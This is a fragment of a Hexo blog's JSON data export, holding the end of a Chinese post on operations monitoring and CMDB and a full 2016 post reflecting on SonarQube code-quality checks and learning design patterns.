09;&#x4E86;&#x81EA;&#x5DF1;&#x7684;&#x7B54;&#x6848;&#xFF0C;&#x8FD9;&#x91CC;&#x5C31;&#x4E0D;&#x5728;&#x8BE6;&#x8FF0;&#xFF0C;&#x4E00;&#x4E2A;&#x76F8;&#x5BF9;&#x5B8C;&#x5584;&#x7684;&#x8FD0;&#x7EF4;&#x76D1;&#x63A7;&#x4F53;&#x7CFB;&#x662F;&#x5426;&#x5DF2;&#x7ECF;&#x5728;&#x4F60;&#x8111;&#x6D77;&#x4E2D;&#x5F62;&#x6210;&#x4E86;&#x5462;&#xFF1F;</p>\n<blockquote>\n<p>&#x5C0F;&#x8D34;&#x58EB;&#xFF1A;&#x9762;&#x8BD5;&#x4E2D;&#xFF0C;&#x5982;&#x679C;&#x4F60;&#x9047;&#x5230;&#x4E00;&#x4E2A;&#x6709;&#x5F88;&#x5F3A;&#x7684;&#x8D23;&#x4EFB;&#x5FC3;&#xFF0C;&#x8FDE;&#x6D17;&#x6FA1;&#x90FD;&#x8981;&#x5E26;&#x4E0A;&#x624B;&#x673A;&#xFF0C;&#x4EE5;&#x514D;&#x9519;&#x8FC7;&#x62A5;&#x8B66;&#x7684;&#x4EBA;&#xFF0C;&#x4E0D;&#x8981;&#x72B9;&#x8C6B;&#xFF0C;&#x5148;&#x62DB;&#x8FDB;&#x6765;&#x518D;&#x6162;&#x6162;&#x57F9;&#x517B;&#x5427;&#x3002;&#x8D23;&#x4EFB;&#x5FC3;&#x662F;&#x8FD0;&#x7EF4;&#x5DE5;&#x7A0B;&#x5E08;&#x7684;&#x7B2C;&#x4E00;&#x8981;&#x7D20;&#xFF01;</p>\n</blockquote>\n<p>&#x540E;&#x8BB0;&#xFF1A;&#x5C0F;&#x738B;&#x7684;&#x6545;&#x4E8B;&#x7ED3;&#x675F;&#x4E86;&#xFF0C;&#x5C0F;&#x738B;&#x76EE;&#x524D;&#x88AB;&#x76D1;&#x63A7;&#x7684;&#x5173;&#x7CFB;&#x6811;&#x953B;&#x70BC;&#x7684;&#x8FDE;&#x738B;&#x83F2;&#x3001;&#x674E;&#x4E9A;&#x9E4F;&#x7684;&#x5173;&#x7CFB;&#x90FD;&#x80FD;&#x641E;&#x660E;&#x767D;&#x4E86;&#x3002;&#x53EF;&#x662F;&#x4F60;&#x5462;&#xFF1F;</p>\n<p>&#x5982;&#x679C;&#x4F60;&#x662F;&#x4E00;&#x540D;&#x8FD0;&#x7EF4;&#x5DE5;&#x7A0B;&#x5E08;&#xFF0C;&#x52A8;&#x624B;&#x5E72;&#x5427;&#xFF0C;&#x76D1;&#x63A7;&#x4F1A;&#x662F;&#x4E00;&#x4E2A;&#x4E0D;&#x65AD;&#x5B8C;&#x5584;&#x7684;&#x5DE5;&#x7A0B;&#xFF0C;&#x8FD9;&#x5C31;&#x662F;&#x8FD0;&#x7EF4;&#xFF08;&#x8FD0;&#x8425;&#xFF09;&#x548C;&#x9879;&#x76EE;&#x7684;&#x672C;&#x8D28;&#x533A;&#x522B;&#x3002;</p>\n<p>&#x5982;&#x679C;&#x4F60;&#x662F;&#x4E00;&#x540D;Devops&#xFF0C;&#x90A3;&#x4E48;&#x5F00;&#x59CB;&#x7F16;&#x7A0B;&#x5427;&#xFF01;</p>\n<p>&#x5982;&#x679C;&#x4F60;&#x662F;&#x4E00;&#x540D;&#x8001;&#x677F;&#xFF0C;&#x7ED9;&#x516C;&#x53F8;&#x7684;&#x8FD0;&#x7EF4;&#x5DE5;&#x7A0B;&#x5E08;&#x4E00;&#x4E2A;&#x8F6C;&#x53D8;&#x7684;&#x673A;&#x4F1A;&#x548C;&#x4E00;&#x4E9B;&#x65F6;&#x95F4;&#xFF0C;&#x4EBA;&#x603B;&#x662F;&#x4E0D;&#x65AD;&#x8FDB;&#x6B65;&#x7684;&#xFF01;</p>\n<h2 id=\"FAQ&#xFF1A;\"><a href=\"#FAQ&#xFF1A;\" class=\"headerlink\" title=\"FAQ&#xFF1A;\"></a>FAQ&#xFF1A;</h2><h3 id=\"&#x6545;&#x969C;&#x81EA;&#x52A8;&#x5904;&#x7406;&#x6709;&#x6CA1;&#x6709;&#x76F8;&#x5173;&#x7684;&#x601D;&#x8DEF;&#xFF1F;\"><a href=\"#&#x6545;&#x969C;&#x81EA;&#x52A8;&#x5904;&#x7406;&#x6709;&#x6CA1;&#x6709;&#x76F8;&#x5173;&#x7684;&#x601D;&#x8DEF;&#xFF1F;\" class=\"headerlink\" title=\"&#x6545;&#x969C;&#x81EA;&#x52A8;&#x5904;&#x7406;&#x6709;&#x6CA1;&#x6709;&#x76F8;&#x5173;&#x7684;&#x601D;&#x8DEF;&#xFF1F;\"></a>&#x6545;&#x969C;&#x81EA;&#x52A8;&#x5904;&#x7406;&#x6709;&#x6CA1;&#x6709;&#x76F8;&#x5173;&#x7684;&#x601D;&#x8DEF;&#xFF1F;</h3><p>&#x4E0D;&#x540C;&#x4E1A;&#x52A1;&#x5F62;&#x6001;&#x3001;&#x4E0D;&#x540C;&#x67B6;&#x6784;&#x3001;&#x4E0D;&#x540C;&#x670D;&#x52A1;&#x53EF;&#x80FD;&#x91C7;&#x7528;&#x7684;&#x65B9;&#x5F0F;&#x90FD;&#x4E0D;&#x540C;&#xFF0C;&#x8FD9;&#x4E2A;&#x6CA1;&#x6709;&#x4E00;&#x4E2A;&#x56FA;&#x5B9A;&#x7684;&#x4E1C;&#x897F;&#x5206;&#x4EAB;&#x3002;&#x53EF;&#x4EE5;&#x53C2;&#x8003;&#x4E4B;&#x524D;&#x817E;&#x8BAF;&#x84DD;&#x9CB8;&#x7684;&#x5206;&#x4EAB;&#xFF0C;&#x4ED6;&#x4EEC;&#x5B9E;&#x73B0;&#x4E86;&#x6545;&#x969C;&#x81EA;&#x6108;&#x7684;&#x529F;&#x80FD;&#x3002;</p>\n<h3 id=\"&#x8FD0;&#x7EF4;&#x9700;&#x8981;&#x61C2;&#x4E1A;&#x52A1;&#x5417;&#xFF1F;\"><a href=\"#&#x8FD0;&#x7EF4;&#x9700;&#x8981;&#x61C2;&#x4E1A;&#x52A1;&#x5417;&#xFF1F;\" class=\"headerlink\" title=\"&#x8FD0;&#x7EF4;&#x9700;&#x8981;&#x61C2;&#x4E1A;&#x52A1;&#x5417;&#xFF1F;\"></a>&#x8FD0;&#x7EF4;&#x9700;&#x8981;&#x61C2;&#x4E1A;&#x52A1;&#x5417;&#xFF1F;</h3><p>&#x6211;&#x4E2A;&#x4EBA;&#x7684;&#x89C2;&#x70B9;&#x662F;&#x61C2;&#x4E1A;&#x52A1;&#x80FD;&#x8BA9;&#x8FD0;&#x7EF4;&#x8D70;&#x7684;&#x66F4;&#x8FDC;&#xFF0C;&#x8FD0;&#x7EF4;&#x670D;&#x52A1;&#x7684;&#x5BF9;&#x8C61;&#x4E0D;&#x4E00;&#x5B9A;&#x662F;&#x5176;&#x5B83;&#x90E8;&#x95E8;&#xFF0C;&#x4E3A;&#x4EC0;&#x4E48;&#x4E0D;&#x80FD;&#x662F;&#x7EC8;&#x7AEF;&#x7528;&#x6237;&#x5462;&#xFF1F;</p>\n<p>&#x53EF;&#x4EE5;&#x7AD9;&#x5728;&#x7EC8;&#x7AEF;&#x7528;&#x6237;&#x7684;&#x89C6;&#x89D2;&#x6765;&#x505A;&#x8FD0;&#x7EF4;&#xFF0C;&#x6BD4;&#x5982;&#x6709;&#x7528;&#x6237;&#x53CD;&#x6620;&#x8BBF;&#x95EE;&#x6162;&#xFF0C;&#x4E3A;&#x4EC0;&#x4E48;&#x6162;&#xFF0C;&#x662F;&#x67B6;&#x6784;&#x7684;&#x539F;&#x56E0;&#xFF0C;Nginx&#x914D;&#x7F6E;&#x7684;&#x539F;&#x56E0;&#xFF0C;&#x8FD8;&#x662F;&#x6570;&#x636E;&#x5E93;&#x7684;&#x539F;&#x56E0;&#x3002;</p>\n<p>&#x4E0D;&#x8981;&#x7B49;&#x7740;&#x9886;&#x5BFC;&#x6765;&#x5B89;&#x6392;&#xFF0C;&#x8FD0;&#x7EF4;&#x80FD;&#x5E26;&#x6765;&#x7684;&#x4EF7;&#x503C;&#x662F;&#x9700;&#x8981;&#x8FD0;&#x7EF4;&#x81EA;&#x5DF1;&#x505A;&#x51FA;&#x6765;&#x7684;&#xFF0C;&#x601D;&#x60F3;&#x6709;&#x591A;&#x8FDC;&#xFF0C;&#x8FD0;&#x7EF4;&#x5C31;&#x80FD;&#x8D70;&#x591A;&#x8FDC;&#xFF01;</p>\n<p>&#x90A3;&#x4E48;&#x76D1;&#x63A7;&#x5728;&#x8FD9;&#x91CC;&#x53D1;&#x6325;&#x7684;&#x4F5C;&#x7528;&#x5C31;&#x662F;&#xFF1A;&#x8BA9;&#x6570;&#x636E;&#x8BF4;&#x8BDD;&#xFF01;</p>\n<h3 id=\"&#x505A;&#x76D1;&#x63A7;&#x4E5F;&#x9700;&#x8981;CMDB&#x5417;&#xFF1F;\"><a href=\"#&#x505A;&#x76D1;&#x63A7;&#x4E5F;&#x9700;&#x8981;CMDB&#x5417;&#xFF1F;\" class=\"headerlink\" title=\"&#x505A;&#x76D1;&#x63A7;&#x4E5F;&#x9700;&#x8981;CMDB&#x5417;&#xFF1F;\"></a>&#x505A;&#x76D1;&#x63A7;&#x4E5F;&#x9700;&#x8981;CMDB&#x5417;&#xFF1F;</h3><p>&#x6211;&#x8BA4;&#x4E3A;CMDB&#x662F;&#x57FA;&#x7840;&#xFF0C;&#x5C24;&#x5176;&#x662F;&#x5728;&#x81EA;&#x52A8;&#x5316;&#x8FD0;&#x7EF4;&#x7684;&#x6A21;&#x5F0F;&#x4E0B;&#xFF0C;&#x4F60;&#x9700;&#x8981;&#x6709;&#x4E00;&#x4E2A;&#x5730;&#x65B9;&#x80FD;&#x51C6;&#x786E;&#x7684;&#x63D0;&#x4F9B;&#x4E00;&#x53F0;&#x670D;&#x52A1;&#x5668;&#x653E;&#x5728;&#x54EA;&#x4E2A;&#x4F4D;&#x7F6E;&#x3001;&#x914D;&#x7F6E;&#x662F;&#x4EC0;&#x4E48;&#xFF1F;&#x4EC0;&#x4E48;&#x65F6;&#x5019;&#x8D2D;&#x4E70;&#x7684;&#xFF1F;&#x4EC0;&#x4E48;&#x65F6;&#x5019;&#x8FC7;&#x4FDD;&#xFF1F;&#x90FD;&#x8FD0;&#x884C;&#x4E86;&#x54EA;&#x4E9B;&#x670D;&#x52A1;&#x3001;&#x5F00;&#x653E;&#x4E86;&#x4EC0;&#x4E48;&#x7AEF;&#x53E3;&#x3001;&#x7248;&#x672C;&#x662F;&#x4EC0;&#x4E48;&#xFF08;&#x5347;&#x7EA7;&#x65F6;&#x4F7F;&#x7528;&#xFF09;&#x3002;</p>\n<p>&#x6709;&#x4E86;&#x8FD9;&#x4E9B;&#x6570;&#x636E;&#xFF0C;&#x5C31;&#x53EF;&#x4EE5;&#x8F7B;&#x677E;&#x548C;&#x914D;&#x7F6E;&#x7BA1;&#x7406;&#x7CFB;&#x7EDF;&#x3001;&#x90E8;&#x7F72;&#x7CFB;&#x7EDF;&#x3001;&#x76D1;&#x63A7;&#x7CFB;&#x7EDF;&#x6709;&#x6548;&#x7684;&#x7ED3;&#x5408;&#x8D77;&#x6765;&#x3002;&#x603B;&#x7ED3;&#x8D77;&#x6765;&#x5C31;&#x662F;&#xFF1A;&#x4EE5;&#x4E1A;&#x52A1;&#x4E3A;&#x5BFC;&#x5411;&#x3001;&#x4EE5;CMDB&#x4E3A;&#x4E2D;&#x5FC3;&#x3001;&#x4EE5;API&#x4E3A;&#x57FA;&#x7840;&#x6765;&#x8FDB;&#x884C;&#x8FD0;&#x7EF4;&#x4F53;&#x7CFB;&#x7684;&#x5EFA;&#x8BBE;&#x3002;</p>\n<p>&#x6709;&#x4E86;CMDB&#x7684;&#x6570;&#x636E;&#x652F;&#x6491;&#xFF0C;&#x90A3;&#x4E9B;&#x770B;&#x7740;&#x9AD8;&#x5927;&#x4E0A;&#x7684;&#x81EA;&#x52A8;&#x7ED8;&#x51FA;&#x67B6;&#x6784;&#x56FE;&#x548C;&#x673A;&#x67DC;&#x56FE;&#x5C31;&#x4E0D;&#x662F;&#x96BE;&#x4E8B;&#x4E86;&#x3002;</p>"},{"title":"从SonarQube谈设计模式","date":"2016-06-05T13:42:13.000Z","toc":false,"_content":"\n\n#### SonarQube\nSonarQube是用来检测代码质量的，但类似工具的推广常常遇到阻碍。\n\n\n成型项目或僵尸项目可以理解，项目优化需要投入的人力成本和时间成本太大，而且最主要的是无法保证改动过程中不引入新的bug。那么大家会想，在项目立项初期配合使用，这应该没什么问题了吧？奈何理由这东西，只要想找，总是有的。毕竟大家都喜欢待在舒适区，不喜欢折腾。试想刚提交完代码没多久，邮件就提醒你需要优化，打开一看，原来又是for循环太多、嵌套太多、重复代码太多或者方法行数太多。why？我实现功能不就行了吗？时间这么紧迫，怎么有时间修改这种问题呢？连这些小问题都抓住不放？呵呵，以后有时间一定改。\n\n\n我起初也这么想的，虽然知道好的习惯养成很重要，但还是避免不了有所抵触。不过好在上头规定相关类型bug必须清零，坚持的时间一长，收获还是蛮大，最直接的体现就是代码易读性加强了。这个时候我突然就想起了设计模式。\n\n\n#### 设计模式\n自大二接触Java以来，就知道IT界有一种无上功法叫设计模式，然后就一直想着哪天能融会贯通，挥手间，就是一片锦绣代码。\n<!-- more -->\n可是这些年过去，设计模式给我的感觉就是遥不可及，仿佛它只存在于面试题中，而且奇怪的是大家闲时谈论技术也很少涉及，why? 首先自我反思，那是自身水平不行，get不到核心，但我相信这不是全部原因。\n\n我认为设计模式的出现是为了更好的写好代码，它只是手段，不是目的。奈何这系列手段太高明，完全不是初级菜鸟的菜。初级菜鸟没掌握，那大神级别的平常为什么也不怎么谈论设计模式呢？我想，可能是因为不同层级的人，如果用设计模式里面的逼格名词谈论，根本就无法沟通，因为我们平常是这么讨论的：\n\n- 这个类负责创建这个对象，对。然后这边包装一下，对的。\n- 嗯，你这个类就是针对他的Interface做的一个Adapter，是的。\n- 你这个只创建一次，提高性能。哦，对，没错，但这样更好，balabala...\n\n\n所以设计模式大部分情况下只是给大家提供了一条快速提升逼格的途径，要是没有时间上的积累，就算把所有设计模式的名字都背下来，可能还是不太会用 0.0\n\n\n#### SonarQube & 设计模式\n\n那么怎么才能优雅的掌握设计模式呐，想来想去，我的方法是先了解它的各种使用，知道它的存在，然后在具体的使用层面上只是借鉴它。如果你对代码有高要求，在任何情况下，都会努力去提高代码的可读性，都会去控制你的代码量、减少嵌套与循环、减少各种潜在风险时，我想时间长了，无师自通，自有一番风景。\n\n![项目重构（优化）原则](http://7xvfir.com1.z0.glb.clouddn.com/%E4%BB%8ESonarQube%E8%B0%88%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/1.png)","source":"_posts/从SonarQube谈设计模式.md","raw":"---\ntitle: 从SonarQube谈设计模式\ntags:\n  - SonarQube\n  - 设计模式\ncategories:\n  - 相关感悟\ndate: 2016-6-5 21:42:13\ntoc: false\n---\n\n\n#### SonarQube\nSonarQube是用来检测代码质量的，但类似工具的推广常常遇到阻碍。\n\n\n成型项目或僵尸项目可以理解，项目优化需要投入的人力成本和时间成本太大，而且最主要的是无法保证改动过程中不引入新的bug。那么大家会想，在项目立项初期配合使用，这应该没什么问题了吧？奈何理由这东西，只要想找，总是有的。毕竟大家都喜欢待在舒适区，不喜欢折腾。试想刚提交完代码没多久，邮件就提醒你需要优化，打开一看，原来又是for循环太多、嵌套太多、重复代码太多或者方法行数太多。why？我实现功能不就行了吗？时间这么紧迫，怎么有时间修改这种问题呢？连这些小问题都抓住不放？呵呵，以后有时间一定改。\n\n\n我起初也这么想的，虽然知道好的习惯养成很重要，但还是避免不了有所抵触。不过好在上头规定相关类型bug必须清零，坚持的时间一长，收获还是蛮大，最直接的体现就是代码易读性加强了。这个时候我突然就想起了设计模式。\n\n\n#### 设计模式\n自大二接触Java以来，就知道IT界有一种无上功法叫设计模式，然后就一直想着哪天能融会贯通，挥手间，就是一片锦绣代码。\n<!-- more -->\n可是这些年过去，设计模式给我的感觉就是遥不可及，仿佛它只存在于面试题中，而且奇怪的是大家闲时谈论技术也很少涉及，why? 首先自我反思，那是自身水平不行，get不到核心，但我相信这不是全部原因。\n\n我认为设计模式的出现是为了更好的写好代码，它只是手段，不是目的。奈何这系列手段太高明，完全不是初级菜鸟的菜。初级菜鸟没掌握，那大神级别的平常为什么也不怎么谈论设计模式呢？我想，可能是因为不同层级的人，如果用设计模式里面的逼格名词谈论，根本就无法沟通，因为我们平常是这么讨论的：\n\n- 这个类负责创建这个对象，对。然后这边包装一下，对的。\n- 嗯，你这个类就是针对他的Interface做的一个Adapter，是的。\n- 你这个只创建一次，提高性能。哦，对，没错，但这样更好，balabala...\n\n\n所以设计模式大部分情况下只是给大家提供了一条快速提升逼格的途径，要是没有时间上的积累，就算把所有设计模式的名字都背下来，可能还是不太会用 0.0\n\n\n#### SonarQube & 设计模式\n\n那么怎么才能优雅的掌握设计模式呐，想来想去，我的方法是先了解它的各种使用，知道它的存在，然后在具体的使用层面上只是借鉴它。如果你对代码有高要求，在任何情况下，都会努力去提高代码的可读性，都会去控制你的代码量、减少嵌套与循环、减少各种潜在风险时，我想时间长了，无师自通，自有一番风景。\n\n![项目重构（优化）原则](http://7xvfir.com1.z0.glb.clouddn.com/%E4%BB%8ESonarQube%E8%B0%88%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/1.png)","slug":"从SonarQube谈设计模式","published":1,"updated":"2016-11-17T11:59:42.678Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ciwbruldn003ygwtmaqwbh9p3","content":"<h4 id=\"SonarQube\"><a href=\"#SonarQube\" class=\"headerlink\" title=\"SonarQube\"></a>SonarQube</h4><p>SonarQube&#x662F;&#x7528;&#x6765;&#x68C0;&#x6D4B;&#x4EE3;&#x7801;&#x8D28;&#x91CF;&#x7684;&#xFF0C;&#x4F46;&#x7C7B;&#x4F3C;&#x5DE5;&#x5177;&#x7684;&#x63A8;&#x5E7F;&#x5E38;&#x5E38;&#x9047;&#x5230;&#x963B;&#x788D;&#x3002;</p>\n<p>&#x6210;&#x578B;&#x9879;&#x76EE;&#x6216;&#x50F5;&#x5C38;&#x9879;&#x76EE;&#x53EF;&#x4EE5;&#x7406;&#x89E3;&#xFF0C;&#x9879;&#x76EE;&#x4F18;&#x5316;&#x9700;&#x8981;&#x6295;&#x5165;&#x7684;&#x4EBA;&#x529B;&#x6210;&#x672C;&#x548C;&#x65F6;&#x95F4;&#x6210;&#x672C;&#x592A;&#x5927;&#xFF0C;&#x800C;&#x4E14;&#x6700;&#x4E3B;&#x8981;&#x7684;&#x662F;&#x65E0;&#x6CD5;&#x4FDD;&#x8BC1;&#x6539;&#x52A8;&#x8FC7;&#x7A0B;&#x4E2D;&#x4E0D;&#x5F15;&#x5165;&#x65B0;&#x7684;bug&#x3002;&#x90A3;&#x4E48;&#x5927;&#x5BB6;&#x4F1A;&#x60F3;&#xFF0C;&#x5728;&#x9879;&#x76EE;&#x7ACB;&#x9879;&#x521D;&#x671F;&#x914D;&#x5408;&#x4F7F;&#x7528;&#xFF0C;&#x8FD9;&#x5E94;&#x8BE5;&#x6CA1;&#x4EC0;&#x4E48;&#x95EE;&#x9898;&#x4E86;&#x5427;&#xFF1F;&#x5948;&#x4F55;&#x7406;&#x7531;&#x8FD9;&#x4E1C;&#x897F;&#xFF0C;&#x53EA;&#x8981;&#x60F3;&#x627E;&#xFF0C;&#x603B;&#x662F;&#x6709;&#x7684;&#x3002;&#x6BD5;&#x7ADF;&#x5927;&#x5BB6;&#x90FD;&#x559C;&#x6B22;&#x5F85;&#x5728;&#x8212;&#x9002;&#x533A;&#xFF0C;&#x4E0D;&#x559C;&#x6B22;&#x6298;&#x817E;&#x3002;&#x8BD5;&#x60F3;&#x521A;&#x63D0;&#x4EA4;&#x5B8C;&#x4EE3;&#x7801;&#x6CA1;&#x591A;&#x4E45;&#xFF0C;&#x90AE;&#x4EF6;&#x5C31;&#x63D0;&#x9192;&#x4F60;&#x9700;&#x8981;&#x4F18;&#x5316;&#xFF0C;&#x6253;&#x5F00;&#x4E00;&#x770B;&#xFF0C;&#x539F;&#x6765;&#x53C8;&#x662F;for&#x5FAA;&#x73AF;&#x592A;&#x591A;&#x3001;&#x5D4C;&#x5957;&#x592A;&#x591A;&#x3001;&#x91CD;&#x590D;&#x4EE3;&#x7801;&#x592A;&#x591A;&#x6216;&#x8005;&#x65B9;&#x6CD5;&#x884C;&#x6570;&#x592A;&#x591A;&#x3002;why&#xFF1F;&#x6211;&#x5B9E;&#x73B0;&#x529F;&#x80FD;&#x4E0D;&#x5C31;&#x884C;&#x4E86;&#x5417;&#xFF1F;&#x65F6;&#x95F4;&#x8FD9;&#x4E48;&#x7D27;&#x8FEB;&#xFF0C;&#x600E;&#x4E48;&#x6709;&#x65F6;&#x95F4;&#x4FEE;&#x6539;&#x8FD9;&#x79CD;&#x95EE;&#x9898;&#x5462;&#xFF1F;&#x8FDE;&#x8FD9;&#x4E9B;&#x5C0F;&#x95EE;&#x9898;&#x90FD;&#x6293;&#x4F4F;&#x4E0D;&#x653E;&#xFF1F;&#x5475;&#x5475;&#xFF0C;&#x4EE5;&#x540E;&#x6709;&#x65F6;&#x95F4;&#x4E00;&#x5B9A;&#x6539;&#x3002;</p>\n<p>&#x6211;&#x8D77;&#x521D;&#x4E5F;&#x8FD9;&#x4E48;&#x60F3;&#x7684;&#xFF0C;&#x867D;&#x7136;&#x77E5;&#x9053;&#x597D;&#x7684;&#x4E60;&#x60EF;&#x517B;&#x6210;&#x5F88;&#x91CD;&#x8981;&#xFF0C;&#x4F46;&#x8FD8;&#x662F;&#x907F;&#x514D;&#x4E0D;&#x4E86;&#x6709;&#x6240;&#x62B5;&#x89E6;&#x3002;&#x4E0D;&#x8FC7;&#x597D;&#x5728;&#x4E0A;&#x5934;&#x89C4;&#x5B9A;&#x76F8;&#x5173;&#x7C7B;&#x578B;bug&#x5FC5;&#x987B;&#x6E05;&#x96F6;&#xFF0C;&#x575A;&#x6301;&#x7684;&#x65F6;&#x95F4;&#x4E00;&#x957F;&#xFF0C;&#x6536;&#x83B7;&#x8FD8;&#x662F;&#x86EE;&#x5927;&#xFF0C;&#x6700;&#x76F4;&#x63A5;&#x7684;&#x4F53;&#x73B0;&#x5C31;&#x662F;&#x4EE3;&#x7801;&#x6613;&#x8BFB;&#x6027;&#x52A0;&#x5F3A;&#x4E86;&#x3002;&#x8FD9;&#x4E2A;&#x65F6;&#x5019;&#x6211;&#x7A81;&#x7136;&#x5C31;&#x60F3;&#x8D77;&#x4E86;&#x8BBE;&#x8BA1;&#x6A21;&#x5F0F;&#x3002;</p>\n<h4 id=\"&#x8BBE;&#x8BA1;&#x6A21;&#x5F0F;\"><a href=\"#&#x8BBE;&#x8BA1;&#x6A21;&#x5F0F;\" class=\"headerlink\" title=\"&#x8BBE;&#x8BA1;&#x6A21;&#x5F0F;\"></a>&#x8BBE;&#x8BA1;&#x6A21;&#x5F0F;</h4><p>&#x81EA;&#x5927;&#x4E8C;&#x63A5;&#x89E6;Java&#x4EE5;&#x6765;&#xFF0C;&#x5C31;&#x77E5;&#x9053;IT&#x754C;&#x6709;&#x4E00;&#x79CD;&#x65E0;&#x4E0A;&#x529F;&#x6CD5;&#x53EB;&#x8BBE;&#x8BA1;&#x6A21;&#x5F0F;&#xFF0C;&#x7136;&#x540E;&#x5C31;&#x4E00;&#x76F4;&#x60F3;&#x7740;&#x54EA;&#x5929;&#x80FD;&#x878D;&#x4F1A;&#x8D2F;&#x901A;&#xFF0C;&#x6325;&#x624B;&#x95F4;&#xFF0C;&#x5C31;&#x662F;&#x4E00;&#x7247;&#x9526;&#x7EE3;&#x4EE3;&#x7801;&#x3002;<br><a id=\"more\"></a><br>&#x53EF;&#x662F;&#x8FD9;&#x4E9B;&#x5E74;&#x8FC7;&#x53BB;&#xFF0C;&#x8BBE;&#x8BA1;&#x6A21;&#x5F0F;&#x7ED9;&#x6211;&#x7684;&#x611F;&#x89C9;&#x5C31;&#x662F;&#x9065;&#x4E0D;&#x53EF;&#x53CA;&#xFF0C;&#x4EFF;&#x4F5B;&#x5B83;&#x53EA;&#x5B58;&#x5728;&#x4E8E;&#x9762;&#x8BD5;&#x9898;&#x4E2D;&#xFF0C;&#x800C;&#x4E14;&#x5947;&#x602A;&#x7684;&#x662F;&#x5927;&#x5BB6;&#x95F2;&#x65F6;&#x8C08;&#x8BBA;&#x6280;&#x672F;&#x4E5F;&#x5F88;&#x5C11;&#x6D89;&#x53CA;&#xFF0C;why? &#x9996;&#x5148;&#x81EA;&#x6211;&#x53CD;&#x601D;&#xFF0C;&#x90A3;&#x662F;&#x81EA;&#x8EAB;&#x6C34;&#x5E73;&#x4E0D;&#x884C;&#xFF0C;get&#x4E0D;&#x5230;&#x6838;&#x5FC3;&#xFF0C;&#x4F46;&#x6211;&#x76F8;&#x4FE1;&#x8FD9;&#x4E0D;&#x662F;&#x5168;&#x90E8;&#x539F;&#x56E0;&#x3002;</p>\n<p>&#x6211;&#x8BA4;&#x4E3A;&#x8BBE;&#x8BA1;&#x6A21;&#x5F0F;&#x7684;&#x51FA;&#x73B0;&#x662F;&#x4E3A;&#x4E86;&#x66F4;&#x597D;&#x7684;&#x5199;&#x597D;&#x4EE3;&#x7801;&#xFF0C;&#x5B83;&#x53EA;&#x662F;&#x624B;&#x6BB5;&#xFF0C;&#x4E0D;&#x662F;&#x76EE;&#x7684;&#x3002;&#x5948;&#x4F55;&#x8FD9;&#x7CFB;&#x5217;&#x624B;&#x6BB5;&#x592A;&#x9AD8;&#x660E;&#xFF0C;&#x5B8C;&#x5168;&#x4E0D;&#x662F;&#x521D;&#x7EA7;&#x83DC;&#x9E1F;&#x7684;&#x83DC;&#x3002;&#x521D;&#x7EA7;&#x83DC;&#x9E1F;&#x6CA1;&#x638C;&#x63E1;&#xFF0C;&#x90A3;&#x5927;&#x795E;&#x7EA7;&#x522B;&#x7684;&#x5E73;&#x5E38;&#x4E3A;&#x4EC0;&#x4E48;&#x4E5F;&#x4E0D;&#x600E;&#x4E48;&#x8C08;&#x8BBA;&#x8BBE;&#x8BA1;&#x6A21;&#x5F0F;&#x5462;&#xFF1F;&#x6211;&#x60F3;&#xFF0C;&#x53EF;&#x80FD;&#x662F;&#x56E0;&#x4E3A;&#x4E0D;&#x540C;&#x5C42;&#x7EA7;&#x7684;&#x4EBA;&#xFF0C;&#x5982;&#x679C;&#x7528;&#x8BBE;&#x8BA1;&#x6A21;&#x5F0F;&#x91CC;&#x9762;&#x7684;&#x903C;&#x683C;&#x540D;&#x8BCD;&#x8C08;&#x8BBA;&#xFF0C;&#x6839;&#x672C;&#x5C31;&#x65E0;&#x6CD5;&#x6C9F;&#x901A;&#xFF0C;&#x56E0;&#x4E3A;&#x6211;&#x4EEC;&#x5E73;&#x5E38;&#x662F;&#x8FD9;&#x4E48;&#x8BA8;&#x8BBA;&#x7684;&#xFF1A;</p>\n<ul>\n<li>&#x8FD9;&#x4E2A;&#x7C7B;&#x8D1F;&#x8D23;&#x521B;&#x5EFA;&#x8FD9;&#x4E2A;&#x5BF9;&#x8C61;&#xFF0C;&#x5BF9;&#x3002;&#x7136;&#x540E;&#x8FD9;&#x8FB9;&#x5305;&#x88C5;&#x4E00;&#x4E0B;&#xFF0C;&#x5BF9;&#x7684;&#x3002;</li>\n<li>&#x55EF;&#xFF0C;&#x4F60;&#x8FD9;&#x4E2A;&#x7C7B;&#x5C31;&#x662F;&#x9488;&#x5BF9;&#x4ED6;&#x7684;Interface&#x505A;&#x7684;&#x4E00;&#x4E2A;Adapter&#xFF0C;&#x662F;&#x7684;&#x3002;</li>\n<li>&#x4F60;&#x8FD9;&#x4E2A;&#x53EA;&#x521B;&#x5EFA;&#x4E00;&#x6B21;&#xFF0C;&#x63D0;&#x9AD8;&#x6027;&#x80FD;&#x3002;&#x54E6;&#xFF0C;&#x5BF9;&#xFF0C;&#x6CA1;&#x9519;&#xFF0C;&#x4F46;&#x8FD9;&#x6837;&#x66F4;&#x597D;&#xFF0C;balabala&#x2026;</li>\n</ul>\n<p>&#x6240;&#x4EE5;&#x8BBE;&#x8BA1;&#x6A21;&#x5F0F;&#x5927;&#x90E8;&#x5206;&#x60C5;&#x51B5;&#x4E0B;&#x53EA;&#x662F;&#x7ED9;&#x5927;&#x5BB6;&#x63D0;&#x4F9B;&#x4E86;&#x4E00;&#x6761;&#x5FEB;&#x901F;&#x63D0;&#x5347;&#x903C;&#x683C;&#x7684;&#x9014;&#x5F84;&#xFF0C;&#x8981;&#x662F;&#x6CA1;&#x6709;&#x65F6;&#x95F4;&#x4E0A;&#x7684;&#x79EF;&#x7D2F;&#xFF0C;&#x5C31;&#x7B97;&#x628A;&#x6240;&#x6709;&#x8BBE;&#x8BA1;&#x6A21;&#x5F0F;&#x7684;&#x540D;&#x5B57;&#x90FD;&#x80CC;&#x4E0B;&#x6765;&#xFF0C;&#x53EF;&#x80FD;&#x8FD8;&#x662F;&#x4E0D;&#x592A;&#x4F1A;&#x7528; 0.0</p>\n<h4 id=\"SonarQube-amp-&#x8BBE;&#x8BA1;&#x6A21;&#x5F0F;\"><a href=\"#SonarQube-amp-&#x8BBE;&#x8BA1;&#x6A21;&#x5F0F;\" class=\"headerlink\" title=\"SonarQube &amp; &#x8BBE;&#x8BA1;&#x6A21;&#x5F0F;\"></a>SonarQube &amp; 